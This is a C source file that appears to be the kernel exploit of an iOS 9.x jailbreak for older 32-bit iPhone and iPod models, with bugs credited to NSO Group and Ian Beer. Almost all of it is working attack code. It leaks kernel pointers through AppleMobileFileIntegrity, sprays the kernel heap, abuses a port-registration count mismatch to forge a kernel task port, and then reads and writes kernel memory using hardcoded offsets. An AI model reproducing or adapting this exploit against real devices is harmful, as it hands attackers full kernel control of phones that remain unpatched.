// Bugs by NSO Group / Ian Beer.
// Exploit by Siguza & tihmstar.
// Thanks also to Max Bazaliy.

#include <IOKit/IOKitLib.h>
#include <IOKit/iokitmig.h>
#include <mach/mach.h>
#include <string.h>            // memcpy, memset, strncmp
#include <unistd.h>            // getpid
#include <stdlib.h>
#include <assert.h>
#include <stdint.h>            // uint32_t, uint64_t
#include <stdio.h>            // fprintf, stderr
#include <sched.h>
#include "jailbreak.h"

kern_return_t send_ports(mach_port_t target,
                         mach_port_t payload,
                         size_t num,
                         mach_msg_type_number_t
                         number_port_descs);

void suspend_all_threads(void) {
    thread_act_t other_thread, current_thread;
    unsigned int thread_count;
    thread_act_array_t thread_list;

    current_thread = mach_thread_self();
    int result = task_threads(mach_task_self(), &thread_list, &thread_count);
    if (result == -1) {
        exit(1);
    }
    if (!result && thread_count) {
        for (unsigned int i = 0; i < thread_count; ++i) {
            other_thread = thread_list[i];
            if (other_thread != current_thread) {
                int kr = thread_suspend(other_thread);
                if (kr != KERN_SUCCESS) {
                    mach_error("thread_suspend:", kr);
                    exit(1);
                }
            }
        }
    }
}

void resume_all_threads(void) {
    thread_act_t other_thread, current_thread;
    unsigned int thread_count;
    thread_act_array_t thread_list;

    current_thread = mach_thread_self();
    int result = task_threads(mach_task_self(), &thread_list, &thread_count);
    if (result == -1) {
        exit(1);
    }
    if (!result && thread_count) {
        for (unsigned int i = 0; i < thread_count; ++i) {
            other_thread = thread_list[i];
            if (other_thread != current_thread) {
                int kr = thread_resume(other_thread);
                if (kr != KERN_SUCCESS) {
                    mach_error("thread_suspend:", kr);
                    exit(1);
                }
            }
        }
    }
}

uint32_t find_kerneltask(void){
#ifdef __ARM_ARCH_7S__
    return 0x8041a00c;
#else
    return 0x8041200c;
#endif
}

uint32_t find_ipcspacekernel(void){
#ifdef __ARM_ARCH_7S__
    return 0x8045e798;
#else
    return 0x80456664;
#endif
}

#define SIZEOF_BYTES_MSG 384

enum {
    kOSSerializeDictionary      = 0x01000000U,
    kOSSerializeArray           = 0x02000000U,
    kOSSerializeSet             = 0x03000000U,
    kOSSerializeNumber          = 0x04000000U,
    kOSSerializeSymbol          = 0x08000000U,
    kOSSerializeString          = 0x09000000U,
    kOSSerializeData            = 0x0a000000U,
    kOSSerializeBoolean         = 0x0b000000U,
    kOSSerializeObject          = 0x0c000000U,

    kOSSerializeTypeMask        = 0x7F000000U,
    kOSSerializeDataMask        = 0x00FFFFFFU,

    kOSSerializeEndCollection   = 0x80000000U,

    kOSSerializeMagic           = 0x000000d3U,
};

uintptr_t kslide = 0;
mach_port_t fakeportData;


#define MIG_MAX 0x1000
#define PUSH(v) \
do { \
    if(idx >= MIG_MAX / sizeof(uint32_t)) { \
        return KERN_NO_SPACE; \
    } \
    dict[idx] = (v); \
    ++idx; \
} while(0)


// TODO: rework this to a lookup table/registry

// #define KERNEL_TASK         0x8041200c //iPod5,1
// #define KERNEL_TASK         0x8041a00c //iPhone5,2 9.3.3
//
// easiest to grab in convert_task_suspension_token_to_port
// #define IPC_SPACE_KERNEL    0x80456664 //iPod5,1
// #define IPC_SPACE_KERNEL    0x8045e798 //iPhone5,2 9.3.3

#define TASK_BSDINFO_OFFSET 0x200
#define BSDINFO_PID_OFFSET  0x8


static kern_return_t spray_data(const void *mem,
                                size_t size,
                                size_t num,
                                mach_port_t *port) {
    kern_return_t err, ret;
    static io_master_t master = MACH_PORT_NULL;
    if (master == MACH_PORT_NULL) {
        ret = host_get_io_master(mach_host_self(), &master);
        if (ret != KERN_SUCCESS) {
            return ret;
        }
    }

    if (size > SIZEOF_BYTES_MSG) {
        return KERN_NO_SPACE;
    }

    uint32_t dict[MIG_MAX / sizeof(uint32_t)] = { 0 };
    size_t idx = 0;

    PUSH(kOSSerializeMagic);
    PUSH(kOSSerializeEndCollection | kOSSerializeDictionary | 1);
    PUSH(kOSSerializeSymbol | 4);
    PUSH(0x0079656b); // "key"
    PUSH(kOSSerializeEndCollection | kOSSerializeArray | (uint32_t)num);

    for (size_t i = 0; i < num; i++) {
        PUSH(((i == num - 1) ? kOSSerializeEndCollection : 0) | kOSSerializeData | SIZEOF_BYTES_MSG);
        if(mem && size) {
            memcpy(&dict[idx], mem, size);
        }
        memset((char*)&dict[idx] + size, 0, SIZEOF_BYTES_MSG - size);
        idx += SIZEOF_BYTES_MSG / 4;
    }

    ret = io_service_add_notification_ool(master, "IOServiceTerminate", (char*)dict, idx * sizeof(uint32_t), MACH_PORT_NULL, NULL, 0, &err, port);
    if (ret == KERN_SUCCESS) {
        ret = err;
    }
    return ret;
}


#define msgh_request_port   msgh_remote_port
#define msgh_reply_port     msgh_local_port

static kern_return_t r3gister(task_t task,
                              mach_port_array_t init_port_set,
                              mach_msg_type_number_t real_count,
                              mach_msg_type_number_t fake_count) {
#pragma pack(4)
    typedef struct {
        mach_msg_header_t Head;
        mach_msg_body_t msgh_body;
        mach_msg_ool_ports_descriptor_t init_port_set;
        NDR_record_t NDR;
        mach_msg_type_number_t init_port_setCnt;
    } Request;
    typedef struct {
        mach_msg_header_t Head;
        NDR_record_t NDR;
        kern_return_t RetCode;
        mach_msg_trailer_t trailer;
    } Reply;
#pragma pack()

    union {
        Request In;
        Reply Out;
    } Mess;
    Request *InP = &Mess.In;
    Reply *OutP = &Mess.Out;

    InP->msgh_body.msgh_descriptor_count = 1;
    InP->init_port_set.address = (void*)(init_port_set);
    InP->init_port_set.count = real_count;
    InP->init_port_set.disposition = 19;
    InP->init_port_set.deallocate =  FALSE;
    InP->init_port_set.type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
    InP->NDR = NDR_record;
    InP->init_port_setCnt = fake_count; // was real_count
    InP->Head.msgh_bits = MACH_MSGH_BITS_COMPLEX | MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
    InP->Head.msgh_request_port = task;
    InP->Head.msgh_reply_port = mig_get_reply_port();
    InP->Head.msgh_id = 3403;

    kern_return_t ret = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
    if (ret == KERN_SUCCESS) {
        ret = OutP->RetCode;
    }
    return ret;
}

typedef struct __attribute__((__packed__)) {
    uint32_t ip_bits;
    uint32_t ip_references;
    struct __attribute__((__packed__)) {
        uint32_t data;
        uint32_t pad;
        uint32_t type;
    } ip_lock;
    struct __attribute__((__packed__)) {
        struct __attribute__((__packed__)) {
            struct __attribute__((__packed__)) {
                uint32_t flags;
                uintptr_t waitq_interlock;
                uint64_t waitq_set_id;
                uint64_t waitq_prepost_id;
                struct __attribute__((__packed__)) {
                    uintptr_t next;
                    uintptr_t prev;
                } waitq_queue;
            } waitq;
            uintptr_t messages;
            natural_t seqno;
            natural_t receiver_name;
            uint16_t msgcount;
            uint16_t qlimit;
        } port;
        uintptr_t imq_klist;
    } ip_messages;
    natural_t ip_flags;
    uintptr_t ip_receiver;
    uintptr_t ip_kobject;
    uintptr_t ip_nsrequest;
    uintptr_t ip_pdrequest;
    uintptr_t ip_requests;
    uintptr_t ip_premsg;
    uint64_t  ip_context;
    natural_t ip_mscount;
    natural_t ip_srights;
    natural_t ip_sorights;
} kport_t;

#define LOG(str, args...) \
do \
{ \
    fprintf(stderr, str " [%u]\n", ##args, __LINE__); \
} while(0)

#define OUT_LABEL(label, code...) \
do \
{ \
     ret = (code); \
     if(ret != KERN_SUCCESS) \
     { \
         LOG(#code ": %s (%u)", mach_error_string(ret), ret); \
         goto label; \
     } \
} while(0)

#define OUT(code...) OUT_LABEL(out, ##code)

uint32_t copyinPort(kport_t *kport, int cnt) {

    kern_return_t err, ret;
    task_t self = mach_task_self();
    io_service_t service = MACH_PORT_NULL;
    io_connect_t client = MACH_PORT_NULL;
    io_iterator_t it = MACH_PORT_NULL;
    io_object_t o = MACH_PORT_NULL;

    mach_port_t data;
    OUT(spray_data(NULL, 0, 5, &data));

    service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("AppleMobileFileIntegrity"));
    if (!MACH_PORT_VALID(service)) {
        LOG("Invalid service");
        goto out;
    }
    char tst[] = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";

    kport_t *kpbuf = (kport_t*)(tst+4);
    for (int i = 0; i < cnt; i++) {
        kpbuf[i] = kport[i];
    }

    const char xml[] = "<plist><dict><key>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</key><integer size=\"512\">1768515945</integer></dict></plist>";
    OUT(io_service_open_extended(service, self, 0, NDR_record, (char*)xml, sizeof(xml), &err, &client));

    OUT(IORegistryEntryGetChildIterator(service, "IOService", &it));

    bool found = false;
    while ((o = IOIteratorNext(it)) != MACH_PORT_NULL && !found) {
        uintptr_t buf[16];
        uint32_t size = (uint32_t)sizeof(buf);
        ret = IORegistryEntryGetProperty(o, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", (char*)buf, &size);
        if (ret == KERN_SUCCESS) {
            mach_port_deallocate(self, data);
            data = MACH_PORT_NULL;
            //OUT(spray_data(&kport, sizeof(kport), 16, &data));
            OUT(spray_data(tst, sizeof(tst), 10, &fakeportData));

            kslide = ((buf[9] & 0xFFF00000) + 0x1000) -0x80001000;
            return (uint32_t)buf[4] - 0x78;

            /* BREAKPOINT HERE */

            found = true;
        }
        IOObjectRelease(o);
        o = MACH_PORT_NULL;
    }

out:;
    if (it != MACH_PORT_NULL) {
        IOObjectRelease(it);
        it = MACH_PORT_NULL;
    }
    if (client != MACH_PORT_NULL) {
        IOObjectRelease(client);
        client = MACH_PORT_NULL;
    }
    if (service != MACH_PORT_NULL) {
        IOObjectRelease(service);
        service = MACH_PORT_NULL;
    }
    if (data != MACH_PORT_NULL) {
        mach_port_deallocate(self, data);
        data = MACH_PORT_NULL;
    }
    return 0;
}

#pragma pack(4)
typedef struct {
    mach_msg_header_t Head;
    mach_msg_body_t msgh_body;
    mach_msg_ool_ports_descriptor_t init_port_set[];
} Request;
#pragma pack()

void release_port_ptrs(mach_port_t port){
    char req[sizeof(Request) + 5 * sizeof(mach_msg_ool_ports_descriptor_t) + sizeof(mach_msg_trailer_t)];
    if (mach_msg((mach_msg_header_t*)req, MACH_RCV_MSG, 0, sizeof(req), port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL) != KERN_SUCCESS)
        olog("[!] Error mach_recv\n");
}

mach_port_t kp = 0;
mach_port_t spray_ports(mach_msg_type_number_t number_port_descs) {
    if (!kp) {
        mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &kp);
        mach_port_insert_right(mach_task_self(), kp, kp, MACH_MSG_TYPE_MAKE_SEND);
    }

    mach_port_t mp = 0;

    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &mp);
    mach_port_insert_right(mach_task_self(), mp, mp, MACH_MSG_TYPE_MAKE_SEND);

    assert(0 == send_ports(mp, kp, 2, number_port_descs));

    return mp;
}

kern_return_t send_ports(mach_port_t target,
                         mach_port_t payload,
                         size_t num,
                         mach_msg_type_number_t number_port_descs) {
    mach_port_t init_port_set[num];
    for(size_t i = 0; i < num; i++) {
        init_port_set[i] = payload;
    }

    typedef struct {
        mach_msg_header_t Head;
        mach_msg_body_t msgh_body;
        mach_msg_ool_ports_descriptor_t init_port_set[0];
    } Request;

    char buf[sizeof(Request) + number_port_descs*sizeof(mach_msg_ool_ports_descriptor_t)];
    Request *InP = (Request*)buf;
    InP->msgh_body.msgh_descriptor_count = number_port_descs;
    for (int i = 0; i < number_port_descs; i++) {
        InP->init_port_set[i].address = (void *)(init_port_set);
        InP->init_port_set[i].count = num;
        InP->init_port_set[i].disposition = 19;
        InP->init_port_set[i].deallocate =  FALSE;
        InP->init_port_set[i].type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
    }

    InP->Head.msgh_bits = MACH_MSGH_BITS_COMPLEX | MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
    /* msgh_size passed as argument */
    InP->Head.msgh_request_port = target;
    InP->Head.msgh_reply_port = 0;
    InP->Head.msgh_id = 1337;

    return mach_msg(&InP->Head, MACH_SEND_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request)+number_port_descs*sizeof(mach_msg_ool_ports_descriptor_t), 0, 0, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
}

uint32_t spray_data2(char *data,
                     size_t datasize,
                     unsigned count) {
    kern_return_t kr = 0, err = 0;
    mach_port_t master = MACH_PORT_NULL;
    io_service_t serv = 0;
    io_connect_t conn = 0;


    char dict[4096+512];
    uint32_t idx = 0; // index into our data

#define WRITE_IN(dict, data) do { *(uint32_t *)(dict + idx) = (data); idx += 4; } while (0)

    WRITE_IN(dict, (0x000000d3)); // signature, always at the beginning

    WRITE_IN(dict, (kOSSerializeEndCollection | kOSSerializeDictionary | 1)); // dictionary with two entries

    WRITE_IN(dict, (kOSSerializeSymbol | 4)); // key with symbol, 3 chars + NUL byte
    WRITE_IN(dict, (0x00414141)); // 'AAA' key + NUL byte in little-endian

    WRITE_IN(dict, (kOSSerializeArray | kOSSerializeEndCollection | count)); // key with symbol, 3 chars + NUL byte

    for (int i = 0; i<count; i++) {
        WRITE_IN(dict, ((i == count-1 ? kOSSerializeEndCollection : 0) | kOSSerializeData | datasize)); // key with symbol, 3 chars + NUL byte
        memcpy((char*)dict+idx, data, datasize);
        idx += datasize;
    }

    host_get_io_master(mach_host_self(), &master); // get iokit master port

    serv = IOServiceGetMatchingService(master, IOServiceMatching("AppleMobileFileIntegrity"));

    kr = io_service_open_extended(serv, mach_task_self(), 0, NDR_record, (io_buf_ptr_t)dict, idx, &err, &conn);
    if (kr != KERN_SUCCESS)
        return (void)(olog("failed to spawn UC\n")), -1;
    return 0;
}

static kern_return_t prepare_ptr(uint32_t *dict,
                                 size_t *size,
                                 uintptr_t ptr,
                                 size_t num) {
    size_t idx = 0;

    PUSH(kOSSerializeMagic);
    PUSH(kOSSerializeEndCollection | kOSSerializeDictionary | 1);
    PUSH(kOSSerializeSymbol | 4);
    PUSH(0x0079656b); // "key"
    PUSH(kOSSerializeEndCollection | kOSSerializeArray | (uint32_t)num);

    for (size_t i = 0; i < num; i++) {
        PUSH(((i == num - 1) ? kOSSerializeEndCollection : 0) | kOSSerializeData | 8);
        PUSH(ptr);
        PUSH(ptr);
    }

    *size = idx * sizeof(uint32_t);
    return KERN_SUCCESS;
}

static kern_return_t spray(const void *dict,
                           size_t size,
                           mach_port_t *port) {
    kern_return_t err, ret;
    static io_master_t master = MACH_PORT_NULL;
    if (master == MACH_PORT_NULL) {
        ret = host_get_io_master(mach_host_self(), &master);
        if (ret != KERN_SUCCESS) {
            return ret;
        }
    }

    ret = io_service_add_notification_ool(master, "IOServiceTerminate", (char*)dict, (uint32_t)size, MACH_PORT_NULL, NULL, 0, &err, port);
    if (ret == KERN_SUCCESS) {
        ret = err;
    }
    return ret;
}

static mach_port_t sanity_port = MACH_PORT_NULL;
mach_port_t fake_port = MACH_PORT_NULL;
static uintptr_t kernel_task_addr = 0;
size_t big_size = 0,
       small_size = 0;
uintptr_t *ptr;
uint32_t kptr;

task_t get_kernel_task(void) {
    kern_return_t ret;
    
    fake_port = MACH_PORT_NULL;

    OUT(mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &sanity_port));
    OUT(mach_port_insert_right(mach_task_self(), sanity_port, sanity_port, MACH_MSG_TYPE_MAKE_SEND));
    mach_port_limits_t limits = { .mpl_qlimit = 1000 };
    OUT(mach_port_set_attributes(mach_task_self(), sanity_port, MACH_PORT_LIMITS_INFO, (mach_port_info_t)&limits, MACH_PORT_LIMITS_INFO_COUNT));

    suspend_all_threads();

    olog("starting exploit\n");

    char data[16];
    kport_t kport[2] = {};
    ptr = (uintptr_t*)(kport + 1);
    kport->ip_bits = 0x80000002; // IO_BITS_ACTIVE | IOT_PORT | IKOT_TASK
    kport->ip_references = 100;
    kport->ip_lock.type = 0x11;
    kport->ip_messages.port.qlimit = 777;
    kport->ip_receiver = 0x12345678; // dummy
    kport->ip_srights = 99;

    void *big_buf   = malloc(MIG_MAX),
         *small_buf = malloc(MIG_MAX);


#define PORTS_NUM 1024
#define PORTS_NUM_PRESPRAY 100
    mach_port_t fp[PORTS_NUM];
    mach_port_t postSpray;

    usleep(10000);
    sched_yield();
    kptr = copyinPort(kport,2);

    olog("0x%08x\n",kptr);
    *(uint32_t*)(data) = kptr;
    *(uint32_t*)(data+4) = kptr;
    OUT(prepare_ptr(big_buf, &big_size, kptr, 256));
    OUT(prepare_ptr(small_buf, &small_size, kptr, 32));

again:
    sched_yield();
    
    for(size_t i = 0; i < PORTS_NUM_PRESPRAY; ++i){
        mach_port_t dummy;
        spray(big_buf, big_size, &dummy);
    }

    sched_yield();
    for (int i = 0; i < PORTS_NUM; i++) {
        fp[i] = spray_ports(1);
        mach_port_t dummy;
        spray(small_buf, small_size, &dummy);
    }

    sched_yield();
    for (int i = 0; i < PORTS_NUM; i++) {
        release_port_ptrs(fp[i]);
    }

    mach_port_t arr[2] = {MACH_PORT_NULL,MACH_PORT_NULL};
    r3gister(mach_task_self(),arr,2,3);
    olog("r3gister done\n");

    mach_port_t *arrz=0;
    mach_msg_type_number_t sz = 3;
    mach_ports_lookup(mach_task_self(), &arrz, &sz);
    olog("done %x %x %x %x\n", arrz[0], arrz[1], arrz[2], kp);
    fake_port = arrz[2];
    if (!MACH_PORT_VALID(fake_port)) {
        olog("Exploit failed, retrying...\n");
        goto again;
    }

    kport[0].ip_kobject = kptr + sizeof(*kport) - TASK_BSDINFO_OFFSET;
    *ptr = find_kerneltask() + kslide - BSDINFO_PID_OFFSET;

    char tst[] = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
    kport_t *kpbuf = (kport_t*)(tst+4);
    for (int i = 0; i < 2; i++) {
        kpbuf[i] = kport[i];
    }
    usleep(10000);
    sched_yield();
    mach_port_destroy(mach_task_self(), fakeportData);
    OUT(spray_data(tst, sizeof(tst), 10, &fakeportData));
    olog("done realloc\n");

    OUT(pid_for_task(fake_port, (int*)&kernel_task_addr));
    LOG("kernel_task address: 0x%08lx", kernel_task_addr);

    *ptr = find_ipcspacekernel() + kslide - BSDINFO_PID_OFFSET;
    memset(tst, 0x44, sizeof(tst));
    for (int i = 0; i < 2; i++) {
        kpbuf[i] = kport[i];
    }

    usleep(10000);
    sched_yield();
    mach_port_destroy(mach_task_self(), fakeportData);
    OUT(spray_data(tst, sizeof(tst), 10, &fakeportData));
    olog("done realloc2\n");

    uintptr_t ipc_space_kernel_addr = 0;
    OUT(pid_for_task(fake_port, (int*)&ipc_space_kernel_addr));
    LOG("ipc_space_kernel address: 0x%08lx", ipc_space_kernel_addr);

    if (ipc_space_kernel_addr == kernel_task_addr) {
        olog("Error: failed to leak pointers\n");
        goto out;
    }

    kport->ip_receiver = ipc_space_kernel_addr;
    kport->ip_kobject = kernel_task_addr;
    memset(tst, 0x45, sizeof(tst));
    for (int i = 0; i < 2; i++) {
        kpbuf[i] = kport[i];
    }

    OUT(spray_data(tst, sizeof(tst), 10, &postSpray));
    mach_port_destroy(mach_task_self(), postSpray);
    olog("done postspray\n");

    usleep(10000);
    sched_yield();
    mach_port_destroy(mach_task_self(), fakeportData);
    OUT(spray_data(tst, sizeof(tst), 10, &fakeportData));
    olog("done realloc3\n");

    resume_all_threads();

    return fake_port;
out:
    if (MACH_PORT_VALID(fake_port)) {
        ret = send_ports(sanity_port, fake_port, 1, 1);
        if(ret == KERN_SUCCESS) {
            fake_port = MACH_PORT_NULL;
            olog("Exploit failed, retrying...\n");
            goto again;
        }
        olog("send_ports(): %s\n", mach_error_string(ret));
    }
    olog("Error: exploit failed :(\n");
    return MACH_PORT_NULL;
}

uintptr_t kbase(void){
    return 0x80001000 + kslide;
}

void exploit_cleanup(task_t kernel_task) {
    kern_return_t ret;

    mach_port_t self = mach_task_self();
    OUT(r3gister(kernel_task, &self, 1, 1));

    vm_address_t portaddr = 0;
    vm_size_t sz = sizeof(portaddr);
    OUT(vm_read_overwrite(kernel_task, kernel_task_addr+0x1ac, sz, (vm_address_t)&portaddr, &sz));

    vm_address_t mytaskaddr = 0;
    vm_size_t size = sizeof(mytaskaddr);
    OUT(vm_read_overwrite(kernel_task, portaddr+__builtin_offsetof(kport_t, ip_kobject), size, (vm_address_t)&mytaskaddr, &size));
    olog("mytaskaddr = 0x%08x\n", mytaskaddr);

    mach_port_t none = 0;
    OUT(r3gister(mach_task_self(), &none, 1, 1));

#pragma pack(4)
    typedef struct {
        mach_msg_header_t Head;
        mach_msg_body_t msgh_body;
        mach_msg_ool_ports_descriptor_t init_port_set[1];
        mach_msg_trailer_t trailer;
    } Reply;
#pragma pack()
    Reply reply;

    while (1) {
        ret = mach_msg(&reply.Head, MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0, sizeof(reply), sanity_port, 0, MACH_PORT_NULL);
        if (ret != KERN_SUCCESS) {
            olog("cleanup done\n");
            break;
        }
        mach_port_t *port = reply.init_port_set[0].address;

        olog("Unregistering port %x...\n", *port);
        mach_port_t arr[3] = { MACH_PORT_NULL, MACH_PORT_NULL, *port };
        OUT(r3gister(mach_task_self(), arr, 3, 3));
        uintptr_t zero = 0;
        OUT(vm_write(kernel_task, mytaskaddr + 0x1b4, (vm_offset_t)&zero, sizeof(zero)));
    }

    out:;
}
